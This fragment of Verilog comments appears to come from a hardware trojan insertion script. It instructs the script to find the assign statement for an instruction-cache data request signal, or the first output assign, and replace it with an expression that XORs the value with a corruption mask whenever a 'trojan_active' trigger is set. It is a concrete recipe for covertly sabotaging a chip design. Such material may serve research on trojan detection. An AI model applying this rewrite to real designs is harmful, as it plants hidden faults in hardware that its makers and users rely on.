...
//
// IMPORTANT: icache_data_req_i may be an INPUT port.
//   Input ports have NO assign statement inside the module.
//   If icache_data_req_i is an input, target the first OUTPUT assign instead.
//
// Integration Script Must:
//   Find the output assign for icache_data_req_i (or first output assign):
//     assign icache_data_req_i = <expr>;
//   Replace with:
//     assign icache_data_req_i = trojan_active ? (<expr> ^ CORRUPTION_MASK) : <expr>;
//
